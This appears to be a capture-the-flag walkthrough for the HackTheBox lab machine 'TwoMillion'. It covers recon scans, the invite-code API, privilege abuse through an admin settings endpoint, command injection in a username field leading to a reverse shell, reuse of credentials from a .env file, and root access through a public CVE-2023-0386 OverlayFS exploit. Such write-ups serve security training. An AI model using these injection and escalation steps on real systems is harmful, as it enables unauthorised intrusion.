---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ✅ TwoMillion

## Recon <a href="#recon" id="recon"></a>

```bash
nmap -p- --min-rate 10000 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 16:59 EDT
Nmap scan report for 2million.htb (10.10.10.11)
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 17:00 EDT
Nmap scan report for 10.10.10.11
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

#### Subdomain <a href="#subdomain-bruteforce" id="subdomain-bruteforce"></a>

`http://2million.htb`

```bash
 ffuf -u http://10.10.10.11 -H "Host: FUZZ.2million.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.11
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.2million.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 408 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```



`Agregar 2millon.htb al archivo /etc/hosts`

```
10.10.10.11 2million.htb
```

### Website - TCP 8 <a href="#website---tcp-80" id="website---tcp-80"></a>

It’s worth taking a look at the full page, as it has some fun easter eggs, including the original 32 machines, and the scoreboard from September 2017.

Most of the links lead to places on the page. The link to `/login` gives a login form:

![image-20230602171248402](https://0xdf.gitlab.io/img/image-20230602171248402.png)

I don’t have creds yet, so nothing here. The forgot password link doesn’t go anywhere.

The “Join” section has a link to `/invite`:

![image-20230602171346375](https://0xdf.gitlab.io/img/image-20230602171346375.png)

This page asks for an invite code, with a message that says “Feel free to hack your way in :)”:

![image-20230606145819478](https://0xdf.gitlab.io/img/image-20230606145819478.png)

This is the original HackTheBox invite challenge - more [below](https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html#background).

**Tech Stack**

The HTTP headers don’t give much additional information:

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 02 Jun 2023 21:13:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 64952
```

The 404 page is the custom throwback HTB 404 page:

![image-20230602171611359](https://0xdf.gitlab.io/img/image-20230602171611359.png)

I’m not able to guess any index page extensions.

**Directory Brute Force**

I’ll run `feroxbuster` against the site:

```
oxdf@hacky$ feroxbuster -u http://2million.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2million.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest     
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       11w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/
401      GET        0l        0w        0c http://2million.htb/api
405      GET        0l        0w        0c http://2million.htb/api/v1/user/register    
302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js     
200      GET       94l      293w     4527c http://2million.htb/register
200      GET       80l      232w     3704c http://2million.htb/login
200      GET       46l      152w     1674c http://2million.htb/404
200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js
200      GET      260l      328w    29158c http://2million.htb/images/logo-transparent.png
200      GET       96l      285w     3859c http://2million.htb/invite
200      GET       13l     2458w   224695c http://2million.htb/css/htb-frontend.css      
200      GET       13l     2209w   199494c http://2million.htb/css/htb-frontpage.css    
405      GET        0l        0w        0c http://2million.htb/api/v1/user/login          
200      GET       27l      201w    15384c http://2million.htb/images/favicon.png         
200      GET      245l      317w    28522c http://2million.htb/images/logofull-tr-web.png  
200      GET        8l     3162w   254388c http://2million.htb/js/htb-frontpage.min.js 
200      GET     1242l     3326w    64952c http://2million.htb/ 
...[snip]...
```

There’s a few interesting things in here before it starts just spewing out 500 errors and I kill it. `/js/inviteapi.min.js` is interesting (and will be important soon). There is a `/register`, which provides a registration form (it still requires an invite code):

![image-20230602172032579](https://0xdf.gitlab.io/img/image-20230602172032579.png)

There are a couple endpoints in `/api/v1/user`. I’ll note that `feroxbuster` finds these by looking at link targets, not be identifying `/api`. Therefore, it doesn’t brute force down this path. I may want to come back to that.

### Shell as www-data <a href="#shell-as-www-data" id="shell-as-www-data"></a>

#### Invite Code Challenge <a href="#invite-code-challenge" id="invite-code-challenge"></a>

**Background**

The Invite Code Challenge was a part of HackTheBox until April 2021. In order to register for an account, you had to hack yourself an invite code. This version is almost exactly the same (with some minor API endpoint changes) as it was back then.

**Identify JavaScript**

At the bottom of the page, there’s a `<script>` tag that includes `/js/inviteapi.min.js`:

![image-20230602173705797](https://0xdf.gitlab.io/img/image-20230602173705797.png)

The JavaScript is packed / minified, but at the bottom there’s two interesting strings:

![image-20230602174354605](https://0xdf.gitlab.io/img/image-20230602174354605.png)

Back on `/invite` (where this code is loaded), I’ll open the browser dev tools, and start typing “make” at the console:

![image-20230602174516201](https://0xdf.gitlab.io/img/image-20230602174516201.png)

It autocompletes that function as `makeInviteCode`. I’ll run it:

![image-20230602174549106](https://0xdf.gitlab.io/img/image-20230602174549106.png)

**Decode Initial Data**

The raw JSON of the response is:

```
{
    "0": 200,
    "success": 1,
    "data": {
        "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
        "enctype": "ROT13"
    },
    "hint": "Data is encrypted ... We should probably check the encryption type in order to decrypt it..."
}
```

The hint says the data is encrypted, and the `encytpe` says it’s ROT13. [rot13.com](https://rot13.com/) is a nice ROT13 decoder:

![image-20230602174803269](https://0xdf.gitlab.io/img/image-20230602174803269.png)

Or I can do it from the command line with `jq` and `tr`:

```
oxdf@hacky$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq -r '.data.data' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

**Generate Code**

To send a POST request to `/api/v1/invite/generate`, I’ll use `curl`. `-X [method]` is how to specify the request method:

```
oxdf@hacky$ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"RzZXQUstVDBYNlktUk5CUk0tQUZYUFo=","format":"encoded"}}
```

To view that nicely, I’ll add `-s` and pipe it into `jq`:

```
oxdf@hacky$ curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "TUlQU1gtNDRFWkctVVNWVTgtMTk0VUs=",
    "format": "encoded"
  }
}
```

**Decode Code**

The result this time says the format is “encoded”. Looking at the `code`, it is all numbers and letters and ends with `=`. That fits base64 encoding nicely. I’ll try decoding that:

```
oxdf@hacky$ echo "TUlQU1gtNDRFWkctVVNWVTgtMTk0VUs=" | base64 -d
MIPSX-44EZG-USVU8-194UK
```

That looks like an invite code. I can test it with the `verifyInviteCode` function in the dev tools console, and it reports it’s valid:

![image-20230602175237864](https://0xdf.gitlab.io/img/image-20230602175237864.png)

When I put that into the form on `/invite`, it redirects to `/register` with the code filled out:

![image-20230602180134413](https://0xdf.gitlab.io/img/image-20230602180134413.png)

I’m able to register here and login.

#### Authenticated Enumeration <a href="#authenticated-enumeration" id="authenticated-enumeration"></a>

**Website**

With an account, I’ve got access to what looks like the original HackTheBox website:

[![image-20230602180451178](https://0xdf.gitlab.io/img/image-20230602180451178.png)](https://0xdf.gitlab.io/img/image-20230602180451178.png)[_Click for full image_](https://0xdf.gitlab.io/img/image-20230602180451178.png)

It says that the site is performing database migrations, and some features are unavailable. In reality, that means most. The Dashboard, Rules, and Change Log links under “Main” work, and have nice throwback pages to the original HTB.

Under “Labs”, the only link that really works is the “Access” page, which leads to `/home/access`:

[![image-20230602180615851](https://0xdf.gitlab.io/img/image-20230602180615851.png)](https://0xdf.gitlab.io/img/image-20230602180615851.png)[_Click for full image_](https://0xdf.gitlab.io/img/image-20230602180615851.png)

Clicking on “Connection Pack” and “Regengerate” both return a `.ovpn` file. It’s a valid OpenVPN connection config, and I can try to connect with it, but it doesn’t work.

**API**

“Connection Pack” sends a GET request to `/api/v1/user/vpn/generate`, and “Regenerate” sends a GET to `/api/v1/user/vpn/regenerate`.

I’ll send on of these requests to Burp Repeater and play with the API. `/api` returns a description:

![image-20230602181111143](https://0xdf.gitlab.io/img/image-20230602181111143.png)

`/api/v1` returns details of the full API:

```
{
  "v1": { 
    "user": {
      "GET": {
        "/api/v1": "Route List",  
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation", 
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

**Enumerate Admin API**

Unsurprisingly, I am not an admin:

![image-20230602181807231](https://0xdf.gitlab.io/img/image-20230602181807231.png)

If I try to POST to `/api/v1/admin/vpn/generate`, it returns 401 Unauthorized:

![image-20230602181939091](https://0xdf.gitlab.io/img/image-20230602181939091.png)

However, a PUT request to `/api/v1/admin/settings/update` doesn’t return 401, but 200, with a different error in the body:

![image-20230602182052397](https://0xdf.gitlab.io/img/image-20230602182052397.png)

#### Get Admin Access <a href="#get-admin-access" id="get-admin-access"></a>

I’ll poke at this endpoint a bit more. As it says the content type is invalid, I’ll look at the `Content-Type` header in my request. There is none so I’ll add one. As the site seems to like JSON, I’ll set it to that:

![image-20230602182213019](https://0xdf.gitlab.io/img/image-20230602182213019.png)

Now it says email is missing. I’ll add that in the body in JSON:

![image-20230602182248469](https://0xdf.gitlab.io/img/image-20230602182248469.png)

Now it wants `is_admin`, so I’ll add that as `true`:

![image-20230602182332129](https://0xdf.gitlab.io/img/image-20230602182332129.png)

It’s looking for 0 or 1. I’ll set it to 1, and it seems to work:

![image-20230602182418615](https://0xdf.gitlab.io/img/image-20230602182418615.png)

If I try the verification again, it says true!

![image-20230602182448977](https://0xdf.gitlab.io/img/image-20230602182448977.png)

#### Command Injection <a href="#command-injection" id="command-injection"></a>

**Enumerate generate API**

As my account is now an admin, I don’t get a 401 response anymore from `/api/v1/admin/vpn/generate`:

![image-20230603130348431](https://0xdf.gitlab.io/img/image-20230603130348431.png)

I’ll add my username, and it generates a VPN key:

![image-20230603130429280](https://0xdf.gitlab.io/img/image-20230603130429280.png)

My account is now admin.

**Injection**

It’s probably not PHP code that generates a VPN key, but rather some Bash tools that generate the necessary information for a VPN key.

It’s worth checking if there is any command injection.

If the server is doing something like `gen_vpn.sh [username]`, then I’ll try putting a `;` in the username to break that into a new command. I’ll also add a `#` at the end to comment out anything that might come after my input. It works:

![image-20230603130843584](https://0xdf.gitlab.io/img/image-20230603130843584.png)

**Shell**

To get a shell, I’ll start `nc` listening on my host, and put a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in as the username:

![image-20230603131015532](https://0xdf.gitlab.io/img/image-20230603131015532.png)

On sending this, I get a shell at my `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.11 38542
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

I’ll upgrade the shell using the `script` / `stty` [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@2million:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@2million:~/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@2million:~/html$
```

### Shell as admin <a href="#shell-as-admin" id="shell-as-admin"></a>

#### Enumeration <a href="#enumeration" id="enumeration"></a>

The web root is in the default location, `/var/www/html`:

```
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Jun  2 22:30 .
drwxr-xr-x  3 root root 4096 May 26 20:34 ..
drwxr-xr-x  2 root root 4096 May 23 19:37 assets
drwxr-xr-x  2 root root 4096 Jun  2 16:30 controllers
drwxr-xr-x  5 root root 4096 May 29 12:21 css
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
drwxr-xr-x  2 root root 4096 May 25 17:57 fonts
drwxr-xr-x  2 root root 4096 May 25 16:23 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  1 20:15 js
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  2 root root 4096 Jun  2 16:15 views
drwxr-xr-x  5 root root 4096 Jun  2 22:30 VPN
```

`index.php` defines a bunch of routes for the various pages and endpoints used on the website.

There’s a `.env` file as well. This file is commonly used in PHP web frame works to set environment variables for use by the application. This application is more faking a `.env` file rather than actually using it in a framework, but the `.env` file still looks the same:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

#### su / SSH <a href="#su--ssh" id="su--ssh"></a>

That password works for both `su` as admin:

```
www-data@2million:~/html$ su - admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$
```

And SSH:

```
oxdf@hacky$ sshpass -p SuperDuperPass123 ssh admin@2million.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
...[snip]...
You have mail.
...[snip]...
admin@2million:~$
```

Either way, I can grab `user.txt`:

```
admin@2million:~$ cat user.txt
277c1481************************
```

### Shell as root <a href="#shell-as-root" id="shell-as-root"></a>

#### Enumeration <a href="#enumeration-1" id="enumeration-1"></a>

**Mail**

This exploit could actually be carried out as www-data. But if I do get to admin, there is a hint as to where to look.

When I logged in over SSH, there was a line in the banner that said admin had mail. That is held in `/var/mail/admin`:

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

It talks about needing to patch the OS as well, and mentions a OverlayFS / FUSE CVE.

**Identify Vulnerability**

TwoMillion is running Ubuntu 22.04 with the kernel 5.15.70:

```
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
```

A search for “linux kernel vulnerability fuse overlayfs” limited to the last year returns a bunch of stuff about CVE-2023-0386:

![image-20230602185030063](https://0xdf.gitlab.io/img/image-20230602185030063.png)

It’s a bit hard to figure out exactly what versions are effected. [This Ubuntu page](https://ubuntu.com/security/CVE-2023-0386) shows that it’s fixed in 5.15.0-70.77:

![image-20230602185832675](https://0xdf.gitlab.io/img/image-20230602185832675.png)

It’s not clear how that compares to 5.15.70-051570-generic. That said, this was published on 22 March 2023, and the `uname -a` string shows a compile date of 23 September 2022.

#### CVE-2023-0386 <a href="#cve-2023-0386" id="cve-2023-0386"></a>

**Background**

[This blog](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) from Datadog does a really nice job going into the details of the exploit. The issue has to do with the overlay file system, and how files are moved between them. To exploit this, an attacker first creates a FUSE (File System in User Space) file system, and adds a binary that is owned by userid 0 in that file system and has the SetUID bit set. The error in OverlayFS allows for that file to be copied out of the FUSE FS into the main on maintaining it’s owner and SetUID.

**Exploit**

There’s a [POC for this exploit](https://github.com/xkaneiki/CVE-2023-0386) on GitHub from researcher xkaneiki. The `README.md` is sparse, but gives enough instruction for use.

I’ll download the ZIP version of the repo:

![image-20230602190651754](https://0xdf.gitlab.io/img/image-20230602190651754.png)

I’ll upload it to 2million with `scp`:

```
oxdf@hacky$ sshpass -p SuperDuperPass123 scp CVE-2023-0386-main.zip admin@2million.htb:/tmp/
```

I’ll need two shells on 2million, which is easy to do with SSH. I’ll unzip the exploit, go into the folder, and run `make all` like it says in the `README.md`:

```
admin@2million:/tmp$ unzip CVE-2023-0386-main.zip 
Archive:  CVE-2023-0386-main.zip
c4c65cefca1365c807c397e953d048506f3de195
   creating: CVE-2023-0386-main/
  inflating: CVE-2023-0386-main/Makefile  
...[snip]...
  inflating: CVE-2023-0386-main/test/mnt.c  
admin@2million:/tmp$ cd CVE-2023-0386-main/
admin@2million:/tmp/CVE-2023-0386-main$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
...[snip]..
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

It throws some errors, but there are now three binaries that weren’t there before:

```
admin@2million:/tmp/CVE-2023-0386-main$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
```

In the first session, I’ll run the next command from the instructions:

```
admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
```

It hangs.

In the other window, I’ll run the exploit:

```
admin@2million:/tmp/CVE-2023-0386-main$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun  2 23:11 .
drwxrwxr-x 6 root   root     4096 Jun  2 23:11 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main#
```

That’s a root shell!

I’ll grab `root.txt`:

```
root@2million:/root# cat root.txt
05636c51************************
```
